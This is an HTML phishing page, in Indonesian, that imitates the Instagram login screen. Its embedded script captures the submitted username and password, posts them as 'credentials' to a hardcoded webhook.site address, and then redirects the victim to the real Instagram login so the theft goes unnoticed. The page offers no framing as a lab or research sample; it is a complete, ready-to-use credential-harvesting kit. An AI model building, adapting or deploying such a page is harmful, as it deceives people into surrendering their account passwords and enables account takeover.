<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
<title>Instagram</title>
<link rel="icon" href="/ig-logo.svg">
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
body{background:#fafafa;min-height:100vh;display:flex;flex-direction:column;align-items:center}
.wrap{width:100%;max-width:350px;padding:20px 16px;margin-top:32px}
.logo{text-align:center;margin:22px 0 32px}
.logo img{width:175px;height:auto}
.card{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:24px 28px;margin-bottom:10px}
input{width:100%;padding:9px 8px 7px;background:#fafafa;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;margin-bottom:6px;outline:none;color:#262626}
input:focus{border-color:#a8a8a8;background:#fff}
input::placeholder{color:#8e8e8e;font-size:12px}
.btn{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:0;border-radius:8px;font-weight:600;font-size:14px;margin-top:8px;cursor:pointer}
.btn:disabled{opacity:.7}
.btn:active:not(:disabled){background:#1877f2}
.divider{display:flex;align-items:center;margin:18px 0}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#dbdbdb}
.divider span{padding:0 18px;color:#8e8e8e;font-size:12px;font-weight:600;text-transform:uppercase}
.fb{display:flex;align-items:center;justify-content:center;gap:8px;color:#385185;font-weight:600;font-size:14px;margin-top:16px;text-decoration:none}
.fb svg{width:16px;height:16px;fill:#1877f2}
.forgot{display:block;text-align:center;font-size:12px;color:#00376b;margin-top:16px;text-decoration:none}
.signup{background:#fff;border:1px solid #dbdbdb;border-radius:8px;padding:20px;text-align:center;margin-top:10px;font-size:14px;color:#262626}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
.apps{text-align:center;margin-top:20px;color:#262626;font-size:14px}
.stores{display:flex;justify-content:center;gap:8px;margin-top:12px;align-items:center}
.stores img{height:40px;width:135px;object-fit:contain}
.footer{margin-top:40px;padding:0 20px 30px;text-align:center;font-size:11px;color:#8e8e8e;line-height:1.6;max-width:350px}
.footer a{color:#8e8e8e;text-decoration:none;margin:0 4px;display:inline-block}
.footer .copy{margin-top:12px}
</style>
</head>
<body>
<div class="wrap">
  
  <div class="logo">
    <img src="/ig-logo.svg" alt="Instagram">
  </div>

  <div class="card">
    <form id="loginForm" method="POST" action="#">
      <input type="text" name="username" placeholder="Nomor ponsel, nama pengguna, atau email" required autocomplete="username">
      
      <div style="position:relative">
        <input type="password" name="password" id="pwd" placeholder="Kata sandi" required autocomplete="current-password">
        <span id="togglePwd" style="position:absolute;right:10px;top:9px;font-size:12px;font-weight:600;color:#262626;cursor:pointer">Tampilkan</span>
      </div>
      
      <button type="submit" class="btn">Masuk</button>
    </form>
    
    <div class="divider"><span>ATAU</span></div>
    
    <a href="https://www.instagram.com/accounts/login/" class="fb" target="_blank">
      <svg viewBox="0 0 24 24"><path d="M24 12.07C24 5.41 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.04V9.41c0-3.02 1.8-4.7 4.54-4.7 1.31 0 2.68.24 2.68.24v2.97h-1.5c-1.5 0-1.96.93-1.96 1.89v2.26h3.32l-.53 3.49h-2.8V24C19.62 23.1 24 18.1 24 12.07z"/></svg>
      Masuk dengan Facebook
    </a>
    
    <a href="https://www.instagram.com/accounts/password/reset/" class="forgot" target="_blank">Lupa kata sandi?</a>
  </div>

  <div class="signup">
    Tidak punya akun? <a href="https://www.instagram.com/accounts/emailsignup/" target="_blank">Daftar</a>
  </div>

  <div class="apps">
    <div>Dapatkan aplikasinya.</div>
    <div class="stores">
      <img src="/appstore.svg" alt="App Store">
      <img src="/gplay.svg" alt="Google Play">
    </div>
  </div>
</div>

<div class="footer">
  <a href="#">Meta</a><a href="#">Tentang</a><a href="#">Blog</a><a href="#">Pekerjaan</a><a href="#">Bantuan</a><a href="#">API</a><a href="#">Privasi</a><a href="#">Ketentuan</a><a href="#">Lokasi</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Unggah Kontak</a><a href="#">Meta Verified</a>
  <div class="copy">Bahasa Indonesia &nbsp; © 2026 Instagram from Meta</div>
</div>

<script>
(function(){
  const WEBHOOK_URL = "https://webhook.site/a03551b9-f210-46c8-bfcb-821bad68128d";

  var pwd = document.getElementById('pwd');
  var toggle = document.getElementById('togglePwd');
  if (toggle && pwd) {
    toggle.onclick = function(){
      if (pwd.type === 'password') { pwd.type = 'teks'; toggle.textContent = 'Sembunyikan'; }
      else { pwd.type = 'password'; toggle.textContent = 'Tampilkan'; }
    };
  }

  document.getElementById('loginForm').addEventListener('submit', function(e){
    e.preventDefault();
    var btn = e.target.querySelector('button');
    btn.textContent = 'Memproses...';
    btn.disabled = true;
    var data = Object.fromEntries(new FormData(e.target));
    data.type = "credentials";
    
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify(data)
    })
    .finally(function(){
      window.location.href = 'https://www.instagram.com/accounts/login/';
    });
  });
})();
</script>
</body>
</html>
